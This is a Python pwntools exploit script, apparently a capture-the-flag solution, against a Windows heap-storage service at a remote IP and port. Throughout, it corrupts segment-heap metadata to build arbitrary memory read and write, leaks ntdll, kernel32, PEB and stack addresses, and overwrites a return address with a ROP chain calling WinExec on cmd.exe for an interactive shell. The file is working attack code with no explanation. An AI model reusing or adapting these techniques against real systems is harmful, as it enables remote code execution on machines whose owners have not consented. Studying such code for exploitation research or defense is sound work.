#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "52.198.180.107"
port = 56746
context.arch = "amd64"    
r = remote(host,port)


def alloc(types,size):
    r.recvuntil("Your choice:")
    r.sendline("1")
    r.recvuntil("Type of storage:")
    r.sendline(str(types))
    r.recvuntil("Size:")
    r.sendline(str(size))


def setvalue(storage_idx,types,idx,data):
    r.recvuntil("Your choice:")
    r.sendline("2")
    r.recvuntil("Storage index:")
    r.sendline(str(storage_idx))
    if types != 3: # not string
        r.recvuntil("Index:")
        r.sendline(str(idx))
        r.recvuntil(":")
        r.sendline(str(data))
    else :
        r.recvuntil("Size:")
        r.sendline(str(idx))
        r.recvuntil("Value:")
        r.sendline(data)

def getvalue(storage_idx):
    r.recvuntil("Your choice:")
    r.sendline("3")
    r.recvuntil("Storage index:")
    r.sendline(str(storage_idx))

def destory(storage_idx):
    r.recvuntil("Your choice:")
    r.sendline("4")
    r.recvuntil("Storage index:")
    r.sendline(str(storage_idx))


secret_off = 0x23050
int_1_size_off = 0x2010
target_seg_desc_off = 0x698#2104ffde`00000103
alloc(0,0x8000) # int 0
alloc(1,0x1337) # secret 1
alloc(0,0x8000) # int 2
#alloc(0,0x8000) # int 3 overlap storage
alloc(3,0x20000-1) # str 3 overlap storage
alloc(0, 0x3bd0) #int 4 # fill vs allocater

alloc(0,0x8000) # int 5
setvalue(1,1,-((secret_off-target_seg_desc_off)/8)-1,0x4204ffbd00000103) # overwrite size 
destory(2)
alloc(0,0x8000) # int 2
alloc(3,0x200) # str 6  for leak
alloc(1,0xbeef) # secret 7
setvalue(3,3,0x40+1,b"a"*0x40)
currupt_size_off = -0x4b
currupt_ptr_off = -0x4a
setvalue(7,1,currupt_size_off,0x6161616161616161)
getvalue(3)
r.recvuntil("a"*0x48)
vs_segment = u64(r.recvuntil("\r\n")[:-2].ljust(8,b"\x00")) - 0x80
print("vs_segment:",hex(vs_segment))
setvalue(7,1,currupt_size_off,0x200)

def readmem(addr):
    setvalue(7,1,currupt_ptr_off,addr)
    getvalue(6)
    r.recvuntil("Value:")
    return u64(r.recvuntil("\r\n")[:-2].ljust(8,b"\x00")[:8])


def writemem(addr,data):
    setvalue(7,1,currupt_ptr_off,addr)
    setvalue(6,3,len(data)+1,data)

vs_flink = readmem(vs_segment)
vs_context = vs_flink ^ vs_segment
print(hex(vs_context))
segment_heap = vs_context - 0x2a0
lfh_context = segment_heap + 0x340
AffinityModArray = readmem(lfh_context+0x30)
#ntdll = AffinityModArray - 0x1207f9 # 4 core
ntdll = AffinityModArray - 0x120780 # 2 core
print("ntdll:",hex(ntdll))
pebldr = ntdll+0x16b4c0
immol = pebldr + 0x20
ldrdata_bin = readmem(immol)
bin_entry = readmem(ldrdata_bin+0x28) 
bin_base = bin_entry - 0x2364
print("binbase:",hex(bin_base))
retaddr = bin_base + 0x1ca7
bin_iat = bin_base + 0x3000
readfile = readmem(bin_iat) 
kernel32 = readfile - 0x24ee0
print("kernel32:",hex(kernel32))
winexec = kernel32 + 0x65f80
peb = readmem(ntdll+0x16b448) - 0x80
print("peb:",hex(peb))
teb = peb+0x1000
stack = readmem(teb+0x10+1) << 8
print("stack:",hex(stack))
stack_end = stack + (0x10000 - (stack & 0xffff))
buf = bin_base + 0x5800
writemem(buf,"C:\\Windows\\system32\\cmd.exe\x00")

ret = 0
start = stack_end - 8

for i in range(0x200):
    addr = start - 8*i
    print(i)
    v = readmem(addr)
    if v == retaddr :
        ret = addr
        print("found!")
        break
print("ret:",hex(ret))
if ret == 0 :
    exit()

ret_gadget = bin_base + 0x1b11
rop = b"X"*0x10
pop_rcx = ntdll + 0x8dd2f
rop = p64(pop_rcx) + p64(buf) + p64(ret_gadget) + p64(winexec)  + b"b"*8
raw_input()
writemem(ret,p64(ret_gadget)*12 + rop )
r.interactive()
